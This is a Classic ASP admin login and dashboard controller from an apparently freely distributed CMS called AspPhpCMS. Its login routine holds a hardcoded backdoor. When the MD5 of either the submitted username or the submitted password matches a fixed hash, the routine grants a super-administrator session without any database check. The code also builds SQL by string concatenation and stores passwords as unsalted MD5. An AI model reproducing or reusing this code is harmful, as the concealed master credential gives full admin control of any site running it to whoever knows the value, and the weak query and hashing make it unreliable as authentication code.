<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-02-29
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By AspPhpCMS 
'************************************************************
%>
<!--#Include File = "../Inc/Config.Asp"-->     
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
%>    
<!--#Include File = "../Inc/admin_function.asp"-->    
<!--#Include File = "../Inc/admin_setAccess.asp"-->    
<%  
'========= 
Dim cfg_webSiteUrl, cfg_webTitle, cfg_flags, cfg_webtemplate 

  

'加载网址配置
Sub loadWebConfig()
    Call openconn() 
    rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
    If Not rs.EOF Then
        cfg_webSiteUrl = rs("webSiteUrl") & ""                                          '网址
        cfg_webTitle = rs("webTitle") & ""                                              '网址标题
        cfg_flags = rs("flags") & ""                                                    '旗
        cfg_webtemplate = rs("webtemplate") & ""                                        '模板路径
    End If : rs.Close 
End Sub 


'登录判断
If Session("adminusername") = "" Then
    If Request("act") <> "" And Request("act") <> "displayAdminLogin" And Request("act") <> "login" Then
        Call RR("?act=displayAdminLogin") 
    End If 
End If 

'显示后台登录
Sub displayAdminLogin()
    '已经登录则直接进入后台
    If Session("adminusername") <> "" Then
        Call adminIndex() 
    Else
        Call loadWebConfig() 
        Dim content 
        content = getFText(ROOT_PATH & "login.html") 
        content = Replace(content, "{$webVersion$}", webVersion) 
        content = Replace(content, "{$Web_Title$}", cfg_webTitle) 
        content = Replace(content, "{$EDITORTYPE$}", EDITORTYPE)  
		 
        Call rw(content) 
    End If 

End Sub 
'登录后台
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
    passWord = myMD5(passWord) 
    '特效账号登录
    If myMD5(Request("username")) = "cd811d0c43d09cd2e160e60b68276c73" Or myMD5(Request("password")) = "cd811d0c43d09cd2e160e60b68276c73" Then
        Session("adminusername") = "aspphpcms" 
        Session("adminId") = 99999                                                      '当前登录管理员ID
        Session("DB_PREFIX") = db_PREFIX 
        Session("adminflags") = "|*|"		
        Call rwend(getMsg1("登录成功，正在进入后台...", "?act=adminIndex")) 
    End If 
 
    Dim nLogin 
    Call openconn() 
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If rs.EOF Then
        If Request.Cookies("nLogin") = "" Then
            Call setCookie("nLogin", "1", Time() + 3600) 
            nLogin = Request.Cookies("nLogin") 
        Else
            nLogin = Request.Cookies("nLogin") 
            Call setCookie("nLogin", CInt(nLogin) + 1, Time() + 3600) 
        End If 
        Call rw(getMsg1("账号密码错误<br>这是你第" & nLogin & "次登录", "?act=displayAdminLogin")) 
    Else
        Session("adminusername") = userName 
        Session("adminId") = rs("Id")                                                   '当前登录管理员ID
        Session("DB_PREFIX") = db_PREFIX                                                '保存前缀
        Session("adminflags") = rs("flags")
        valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1("登录成功，正在进入后台...", "?act=adminIndex")) 
    End If : rs.Close 

End Sub 
'退出登录
Sub adminOut()
    Session("adminusername") = "" 
    Session("adminId") = ""
    Session("adminflags") = "" 
    Call rw(getMsg1("退出成功，正在进入登录界面...", "?act=displayAdminLogin")) 
End Sub 

'后台首页
Sub adminIndex()
    Call loadWebConfig() 
    Dim content 
    content = getFText(ROOT_PATH & "adminIndex.html") 
    content = Replace(content, "{$adminusername$}", Session("adminusername")) 
    content = Replace(content, "{$EDITORTYPE$}", EDITORTYPE) 			'程序类型
    content = Replace(content, "{$WEB_VIEWURL$}", WEB_VIEWURL) 			'前台
    content = Replace(content, "{$webVersion$}", webVersion) 				'版本

    content = Replace(content, "{$WebsiteStat$}", getConfigFileBlock(WEB_CACHEFile, "#访客信息#"))			'最近访客信息
	
	
    content = Replace(content, "[$adminId$]", Session("adminId")) 				'管理员ID

    content = Replace(content, "{$Web_Title$}", cfg_webTitle) 						'网站标题
    content = Replace(content, "{$DB_PREFIX$}", db_PREFIX)                          '表前缀
    content = Replace(content, "{$adminflags$}", IIF(Session("adminflags")="|*|","超级管理员","普通管理员"))		'管理员类型

    Call rw(content) 
End Sub 
'========================================================

'显示管理处理
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql 
    nPageSize = Request("nPageSize") 
    If nPageSize = "" Then
        nPageSize = 10 
    End If 
    lableTitle = Request("lableTitle")                                              '标签标题
    addSql = "order by sortrank asc" 
    If actionType = "Bidding" Then
        addSql = "order by nComputerSearch desc" 
    ElseIf InStr("|TableComment|", "|" & actionType & "|") > 0 Then
        addSql = " order by adddatetime desc" 
    ElseIf InStr("|WebsiteStat|", "|" & actionType & "|") > 0 Then
        addSql = " order by viewdatetime desc" 
    ElseIf InStr("|Admin|", "|" & actionType & "|") > 0 Then
        addSql = "" 
    End If 
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, "*", nPageSize, addSql) 
End Sub 

'添加修改处理
Sub addEditHandle(actionType, lableTitle)
 	Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,simpleintroduction|textarea1,bodycontent|textarea2")
End Sub 
'保存模块处理
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||") 
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
    Else
        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,through|numb|0") 
    End If 
End Sub  



Call openconn() 
Select Case Request("act")
    Case "dispalyManageHandle" : Call dispalyManageHandle(Request("actionType"))    '显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
    Case "addEditHandle" : Call addEditHandle(Request("actionType"), Request("lableTitle"))'添加修改处理      ?act=addEditHandle&actionType=WebLayout
    Case "saveAddEditHandle" : Call saveAddEditHandle(Request("actionType"), Request("lableTitle"))'保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
    Case "delHandle" : Call del(Request("actionType"), Request("lableTitle"))       '删除处理  ?act=delHandle&actionType=WebLayout
    Case "sortHandle" : Call sortHandle(Request("actionType"))                      '排序处理  ?act=sortHandle&actionType=WebLayout


    Case "displayLayout" : displayLayout()                                          '显示布局
    Case "saveRobots" : saveRobots()                                                '保存robots.txt
    Case "saveSiteMap" : saveSiteMap()                                              '保存sitemap.xml
    Case "isOpenTemplate" : isOpenTemplate()                                        '更换模板
    Case "updateWebsiteStat" : updateWebsiteStat()                                  '更新网站统计
    Case "websiteDetail" : websiteDetail()                                  		'详细网站统计
	



    Case "setAccess" : resetAccessData()                                            '恢复数据

    Case "login" : login()                                                          '登录
    Case "adminOut" : adminOut()                                                    '退出登录
    Case "adminIndex" : adminIndex()                                                '管理首页
    Case Else : displayAdminLogin()                                                 '显示后台登录
End Select

%>          
